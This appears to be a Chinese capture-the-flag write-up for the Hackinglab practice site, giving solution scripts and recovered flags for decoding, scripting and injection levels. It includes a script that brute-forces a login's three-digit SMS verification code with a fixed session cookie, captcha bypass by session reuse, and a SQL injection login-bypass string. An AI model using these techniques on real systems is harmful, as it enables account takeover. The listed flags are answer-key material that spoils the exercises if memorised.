# Hackinglab
## 基础关
### 03猜猜这是经过了多少次加密
```python
'''
多次base64,base32,base16编码
自动转换明文
BY-ZYA
'''
import codecs
import base64
import re
basestring = b"Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlhSWFRWaENSbFpYZUZOVWJVWTJVbFJDVjAxdVVuWlZha1pYWkVaT2NscEdhR2xTTW1ob1YxWlNTMkl4U2tkWGJHUllZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZXVEpWYkZKSFZqRmFSbUl6WkZkaGExcG9WakJhVDJOdFJraGhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5XRUpIVmpKNFQxWlhTa2RqUm14aFUwaENTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTVZwaFpFZFNTRkpyTlZOaVJtOTNWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSFVuTlZha0p6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZsNlJsZGpiSEJIV2tkc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JVVW14d2VGVXlkR0ZpUmxwelYyeHdXR0V4Y0hKWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUnRWa2RqUld4VllsZG9WRlJYTlc5V1ZscEhXVE5vYVUxWFVucFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaHBVbGhCZDFac1pEUmpNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVk5yWkZOaVJrcDZWa2N4YzFVeVNuSlRiVVpYVFc1b1dGZFdXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZaZUdKSVNsaGhNMUpVVlcxNGQyVkdWbGRoUnpsb1RWWndlbFl5Y0VkV01ERjFZVWhLV2xaWFVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrNXlXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFZWbGN4TkdReVZrZFdXR3hyVWpOU2IxbHNWbmRXTVZwMFkwZEdXR0pHY0ZoWk1HUnZWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsWlpiWFIzWVVaV2RHVkZkR3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFoxWTBaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlWRlJHUzA1c1drZFZhMlJXVFZad01GVnRkRzlWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVLYkZKdFVubGFSV1IzWVZaYWNtTkZiRmRpUjFFd1ZrUktSMVl4VGxsalJuQk9UVzFvV1ZkV1VrZGtNa1pIVjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBWWVRKU1NGVnFSbUZYVm5CSVlVWk9WMVpHV2xaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWGFFeFdNbmhoVjBaV2NscEhSbGROTW1oSlYxUkplRk14U1hoalJXUmhVbFJXVDFWc2FFTlRNVnAwVFZSQ1ZrMVZNVFJXYkdodlYwWmtTR0ZHYkZwaVdHaG9WbTE0YzJOc2NFaFBWM0JUWWtoQ05GWnJZM2RPVmxsNFYyNVNWbUpIYUZoV2FrNU9UVlphV0dNemFGaFNiRnA1V1ZWYWExUnRSbk5YYkZaWFlUSlJNRmRXV2t0ak1WSjFWRzFvVTJKR2NGbFhWM2hoVW0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZ3TUZsVldsTldWbHBZWVVWU1ZrMXVhR2haZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHJaRzlXYkZwMFpVaGtUazFXYkROV01qVkxZa1pLZEZWdWJHRlNWMUl6V1ZaYVlXTnRUa1ppUm1ScFVqRkZkMWRXVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGROYWtaSFdsWmFWMk5zY0VoU2JHUk9UVzFvU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlrWndhVmRIYUc5V2JYQkhZekpOZUdORmFGQldiVkpVV1d4b2IxbFdaRlZSYlVab1RXdHdTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVNsSk5SbFkyVW10MGFrMVlRa3BXYlhoVFlWWktjMk5HYkZoV00xSm9Xa1JCTVdNeFpISmhSM2hUVFVad2FGWnRNSGhWTVVsNFZXNU9XR0pWV2xkVmJYaHpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbTF3UzFNeVRuTlVia3BxVW0xb2NGVnRlSGRsVm1SWlkwVmtWMkpXV2xoV1J6VlBZVlpLZFZGck9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1IxVkd4U2FFMXRhRzlXVjNSWFdWZE9jMVp1UmxSaE0xSlZWbTE0UzAxR2JGWlhhemxYVFZad1NGWXljRXRXTWtwSVZHcFNWV0V5VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5HVm5WWGJHUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVbGhVVmxaM1ZXeGFjMVZyVG1oTlZXdzBWVEZvYzFVeVJYbGhTRUpXWWxoTmVGa3dXbk5XVmtaMVdrVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm01d1YxWkdXbkZUYTFwc1ZteGFNVlZ0ZUdGaFZrbDRVbGhrVjJKVVJUQlpla3BPWlVkT1JtRkdRbGRpVmtwVlYxZDBWMlF4WkhOWGEyaHNVak5DVUZadGVITk9SbGw1VGxaT1YySlZjRWxaVlZwdlZqSkdjazVWT1ZWV2JIQm9WakJrVG1WdFJrZGhSazVwVW01Qk1sWXhXbGRaVjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxME1HRnJNVmRUYWtaWFZqTm9VRmxXV2twbFJrNTFXa1prYUdFd2NGaFdSbFpXWlVaSmVGcElTbWhTTTFKVVZGVmFkMlJzV2tkYVNIQk9WakZhZWxZeGFITlVNVnB5VGxjNVZWWnNXak5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUm1ob1RXMW9WbGRYZEd0aU1rbDRWbTVHVW1KVldsaFphMXAzVFVad1ZtRkhkRlZoZWtaYVZWZDRjMWxXV2xoaFJYaGFZVEZ3WVZwVldtdGpiVTVIWVVkb1RsZEZTbEpXYlRGM1V6RktkRlpyYUZWaE1WcFlXV3RrVTFaR1ZuTlhibVJzVm0xU1dsa3dWbXRXTWtwWFVtcE9WVlpzV25wWlZscEtaVmRHUjFWc2NHbFNNbWd5Vm1wR1lXRXhaRWhXYTJoUVZtdHdUMVpzVWtaTlJtUlZVVzFHV2xac2JEUlhhMVp2WVVaS2MxTnNXbGRpVkVaVVZtdGFkMWRIVmtsVWJHUnBVakZLTmxaclkzaGlNVmw1VWxod1VsZEhhRmhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURjZUVlV4UjFadVVteFNWR3h3VldwQ2QxZHNiRlpWYkU1WFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMlF4UlhoaVJtaFZZVEpTV0ZsdGVFdGpNVlYzV2taT2FrMVhlSGxXTWpWUFZERmFkVkZzWkZwV1YxRjNWakJhUzJOdFNrVlViR1JwVjBWS1ZWWnFTbnBsUmtsNFZHNU9VbUpIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYXpsVlZucEdkbFV5ZUZwbFJsWnlZMGQ0VTJGNlJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXdGFTMWRHV2tWU2JHUnFUV3RhUjFaSGVGTlViRnAxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWMWQwYTJJeVVuTlhXR1JZWWxoU1ZWVnFRbUZUVm14V1YyMUdWV0pGY0RGVlZ6QTFWakpLVlZKVVFscGxhM0JRV1hwR2QxTldUblJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKcmNHRlVWRXBUVlVaYWRHVklUazlTYkd3MVZHeFZOV0ZIU2taalJteGFWbFp3ZWxacVNrWmxSbHBaWVVkR1UwMHlhRFpXYlhCSFdWWmtXRkpyWkdoU2F6VndWVzAxUWsxc1dYaFhiR1JhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1FMUhSbkpOVm1SVVlXdGFXRlpxVG05U1JscHhVMnQwVTAxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVZsUkdXbVZIVGtaaVJsWnBVakpvZDFadGVHRmtNV1JIVjJ0a1dHSlZXbkZVVlZKWFUwWlplR0ZJVGxWTlZuQjVWR3hqTlZaV1duTlhibkJWWWtad2VsWnRNVWRTYkZKeldrZHNWMWRGU2t0V01WcFhWakZWZUZkWVpFNVdiVkp4VldwS2IxbFdVbGRYYm1SV1VtMTBORll5ZUd0aGF6RllWVzVzVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdsZHNWbUZoTVZsM1RWaEdWMkpyY0ZoV2ExWjNWRVpWZUZkclpHcGlWVnBJVjJ0YVQxUnJNWFJoUmxwWFlsUkdNMVY2Ums1bFZsSjFWR3hXYVdFelFuWldWekI0VlRGYVIxVnNWbFJpVkd4d1ZGWmFkMlZXV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlp0VWxaVlZ6RkhZVlV4Y2xkcVFsZGlWRlpNVmpCa1MxTkhWa2RhUm5CcFVqSm9WVlpHVWtka01WbDRXa2hTYTFJelFuQlZha1pLWkRGYVJWSnRkR2xOVm13elZGWldhMkZGTUhsbFJtaGFZa1pLUTFwVlduTmpWa3B6WTBkNFUySldTalZXYWtvMFZUSkdXRk5yYkZKaVIyaFlXV3hvVTFkR1pGZGFSbVJxVFZkU01WVnRlRTloVmtsNFUyNW9WMUpzY0hKV1ZFcFhZekpLUjFkdFJsUlNWRloyVm0weE5HUXlWbGRoTTJSV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNREZIVjFob1ZWZEhhR2hWYkdSVFZqRnNjbHBHVGxoV2JYZ3dWRlphVDJGck1WZGpSRUpoVmxkb1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVdXbmxXUjNocllVZFdjMWRzYkZkaGExcDJXV3BLUjJNeFRuTmhSMmhUWlcxNFdGZFdaREJrTWxKelYydFdVMkpHY0hKVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkZNVmRVYkZKVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKRlNtaFdiR1JUVTBaYWMxZHRSbGROYXpWSVYydGFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5WVVkd1UwMXVhRmxXYWtKWFV6Rk9SMWR1VW14U00xSlFWV3BDVjA1R1dsaE9WazVXVFd0d2VWUnNXbk5YYlVWNFkwZG9WMDFXY0doYVJWVjRWakZPY2s1V1RtbFNiWFExVm14amQyVkdTWGxTYmxKVFlXeHdXRmxyWkc5WlZteFZVbTVrVlZKdGVGaFdNblF3WVdzeGNrNVZhRnBoTVhCMlZtcEJkMlZHVG5SUFZtaG9UVlZ3U1ZkV1VrZFhiVlpIWTBWc1ZHSlhhRlJVVkVaTFZsWmFSMVp0Um10TlYxSllWakowYTFsV1RrbFJiazVXWWtaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pXWlVaa1dWcEZOVmRpVmtwNFZsZHdTMkl4YkZkVmJHUllZbTFTVjFWdE1UQk9SbGw1WlVkMGFHRjZSbGxXVnpWelZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZkSFozcFhiRnBoV1ZkU1JrMVdXbUZTYkZwdldsZDBZVmRzWkhOV2JVWm9UVlpzTTFSV2FFZFdNa3B5WTBab1YyRXhXak5XUlZwV1pVWmtjbHBIY0dsV1ZuQkpWakowWVZReFVuSk5XRkpvVW14d1dGbHNVa2ROTVZZMlVtczFiRlpzU2pGV1IzaFhZVmRGZWxGdWFGZFdla0kwV1dwS1QxSXhXblZWYlhoVVVqRktkMVpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVld3MldWVm9kMWRzV1hwaFJYaGhVbXh3U0ZreWN6VldNVnB6V2tkNGFFMVhPVFZXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkREJXUmxwelkwaG9WazFXU2toV1ZFRjRWakZhY1Zac1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHV0dKV1dsbFdiWFJ2WVRGSmVsRnVRbFppVkZaRVZtcEdZVmRGTVZWVmJXeE9WbXhaTVZaWGVHOWtNVlowVTJ4YVdHSkhhRmhaYkZKSFZURlNWbGR1VGs5aVJYQXdXa1ZhVDFSc1dYaFRXR2hYWWtkUk1GZFdaRWRUUms1eVlrWkthVkl4U2xsWFYzaFRVbXN4UjJORlZsUmlSMUp4VkZaa1UwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcHpZMGhLVjFaRmNGaFpla3BMVWpGa2RGSnNVbE5XUmxveVZtMHdlRTVIVVhsV2JHUm9UVEpTV1ZsdE1WTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVU1SVUydG9hVkpyTlZsVmJGWjNWVEZhZEUxSVpHeFNWRlpKVld4b2IxWXhaRWhoUjJoV1lrZFNWRlpxUm5OamJHUjFXa1prVGxZemFGZFdWRW8wVkRKR2NrMVdaR3BTUlVwb1ZteGFXbVF4YkhKYVJYUlRUV3MxUmxWWGVGZFdNVnB5WTBac1YySllRa05hVlZwTFZqRk9kVlJ0UmxOaWEwcDNWMWN4TUZNeFVsZFhibEpPVTBkb1ZWUldaRk5YUmxwMFRsWmtXRkl3Y0VsV1Z6QTFWMnhhUmxkcVRscGhhMXBvVmpCVmVGWldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZoa1JGcGFWbFpWTVZaVVNrdFhWMFpIWTBaa2FFMVlRakpYVjNCTFVqSk5lRlJ1VG1oU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGWXlkRmRWTWtwV1YyNUdWVlp0VWxSYVYzaHlaREZ3UlZWdGFGZGhNMEY0VmxaYWIyRXhaRWhUYTJSWVltdHdWMWxYZEdGaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnRPVmROVm5CVVZXcEtVbVZXVW5WVWJHaFlVakZLYjFaWGVHOVZNazVYWWtoT1YxWkZXbFJVVmxwSFRrWlplVTFVUW1oU2JIQXdWbGQwYzFkSFJuSk9WRTVYWVd0d1NGa3llRTlrUjBaSFkwZDRhRTFZUWpWV2JYQkRXVlpWZVZSdVRtcFNWMmhVV1d0Vk1XTkdXblJrU0dSWFlrWnNORmRyVWtOWGJGbDRVbXBPVldKR2NISldNR1JMWXpGT2NrOVdaR2hOVm5CTlZqRmFZVmxYVWtoV2ExcGhVbFJzVkZscmFFSmtNV1J6Vm0xR2FFMVdjRmxWTW5SaFlXeEtXR1ZIUmxWV1JUVkVXbFphVjFJeFNsVmlSa1pXVmtSQk5RPT0="

while(1):
    base64_flag=0
    basestring = codecs.decode(basestring,"utf8")
    print(basestring+"\n")
    if '{' in basestring:
        break 
    for i in basestring:
        if(i.islower()):
            basestring = base64.b64decode(basestring)
            print("base64 decode:")
            base64_flag=1
            break
    if(base64_flag):
        continue
    elif(re.match('^[G-Z]',basestring)):
        print("base32 decode:")
        basestring=base64.b32decode(basestring)
        continue
    else:
        print("base16 decode:")
        basestring=base64.b16decode(basestring)
        continue
print ("-"*50+"\nPlain text: "+basestring)

```
##  脚本关
### 01.key又又找不到了 
```python
import requests
import re
url= "http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php"
url= "http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/search_key.php"

r =requests.get(url)
r = re.findall("key is :[ a-z_]{0,32}",r.text)
print(str(r)[11:-2])
```
### 02.快速口算
```python
import requests
import re
url= "http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php"
r = requests.session()
res = r.get(url)
formula = re.findall("[0-9*+()]{28}",res.text)
formula = "".join(formula)
#print(formula)
ans=eval(formula)
#print(ans)
data={'v':ans}
key = r.post(url,data=data)
#print(key.text)
key = re.findall("<body>(.*?)</body>",key.text)
print(str(key)[9:-5])
```
### 04.怎么就是不弹出key呢
```js
/*
本来很简单的一道题 把源码粘贴到console里面就行
结果因为智商一直翻车
说是key is first 14 chars
结果尝试了charsslakfjtes
还有标题中的dbfmnekepjoapo
其实结果是slakfjteslkjsd
*/
var b=function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1s(1e(p,a,c,k,e,r){e=1e(c){1d(c<a?\'\':e(1p(c/a)))+((c=c%a)>1q?1f.1j(c+1k):c.1n(1o))};1g(!\'\'.1h(/^/,1f)){1i(c--)r[e(c)]=k[c]||e(c);k=[1e(e){1d r[e]}];e=1e(){1d\'\\\\w+\'};c=1};1i(c--)1g(k[c])p=p.1h(1l 1m(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);1d p}(\'Y(R(p,a,c,k,e,r){e=R(c){S(c<a?\\\'\\\':e(18(c/a)))+((c=c%a)>17?T.16(c+15):c.12(13))};U(!\\\'\\\'.V(/^/,T)){W(c--)r[e(c)]=k[c]||e(c);k=[R(e){S r[e]}];e=R(){S\\\'\\\\\\\\w+\\\'};c=1};W(c--)U(k[c])p=p.V(Z 11(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c]);S p}(\\\'G(B(p,a,c,k,e,r){e=B(c){A c.L(a)};E(!\\\\\\\'\\\\\\\'.C(/^/,F)){D(c--)r[e(c)]=k[c]||e(c);k=[B(e){A r[e]}];e=B(){A\\\\\\\'\\\\\\\\\\\\\\\\w+\\\\\\\'};c=1};D(c--)E(k[c])p=p.C(I J(\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\'+e(c)+\\\\\\\'\\\\\\\\\\\\\\\\b\\\\\\\',\\\\\\\'g\\\\\\\'),k[c]);A p}(\\\\\\\'t(h(p,a,c,k,e,r){e=o;n(!\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\'.m(/^/,o)){l(c--)r[c]=k[c]||c;k=[h(e){f r[e]}];e=h(){f\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\\'};c=1};l(c--)n(k[c])p=p.m(q s(\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\'+e(c)+\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'g\\\\\\\\\\\\\\\'),k[c]);f p}(\\\\\\\\\\\\\\\'1 3="6";1 4="7";1 5="";8(1 2=0;2<9;2++){5+=3+4}\\\\\\\\\\\\\\\',j,j,\\\\\\\\\\\\\\\'|u|i|b|c|d|v|x|y|j\\\\\\\\\\\\\\\'.z(\\\\\\\\\\\\\\\'|\\\\\\\\\\\\\\\'),0,{}))\\\\\\\',H,H,\\\\\\\'|||||||||||||||A||B||M||D|C|E|F||I||J|G|N|O||P|Q|K\\\\\\\'.K(\\\\\\\'|\\\\\\\'),0,{}))\\\',X,X,\\\'||||||||||||||||||||||||||||||||||||S|R|V|W|U|T|Y|13|Z|11|14|12|10|19|1a|1b|1c\\\'.14(\\\'|\\\'),0,{}))\',1t,1u,\'|||||||||||||||||||||||||||||||||||||||||||||||||||||1e|1d|1f|1g|1h|1i|1v|1s|1l||1m|1n|1o|1r|1k|1j|1q|1p|1w|1x|1y|1z\'.1r(\'|\'),0,{}))',62,98,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||return|function|String|if|replace|while|fromCharCode|29|new|RegExp|toString|36|parseInt|35|split|eval|62|75|53|var|slakfj|teslkjsdflk|for'.split('|'),0,{});
               var d=eval(b);
               console.log(d.substr(0,14));
```
### 05逗比验证码第一期
```
保持住session就行 无脑bp
LJLJL789sdf#@sd
```
### 06逗比验证码第二期
```
保持session 验证码验证成功一次后为空
LJLJL789ss33fasvxcvsdf#@sd
```
### 07逗比的验证码第三期（SESSION）
```python
完全get不到出题人的点 同06
LJLJLfuckvcodesdf#@sd
```
### 10基情燃烧的岁月
```python
import requests
url = "http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php"
for i in range(100,999):
    data={"username":"13388886666","vcode":i,"Login":"submit"}
    cookies={"PHPSESSID":"33db05b635ed36e8564b1aeb47e06eea"}
    r = requests.post(url,data=data,cookies=cookies)
    if(r.text != "vcode or username error"):
        print(r.text)
        break
'''
164
你伤心的发现他/她正在跟你的前男/女友勾搭.....于是下决心看看前任除了跟你的（男/女）闺蜜勾搭，是不是还跟别的勾搭..<br>前 任的手机号码是:13399999999
'''

'''
还要写获取密码的部分 麻烦的一批 不如用bp来的痛快
LKK8*(!@@sd
'''
```
## 注入关
### 
```
admin'or''='
iamflagsafsfskdf11223
```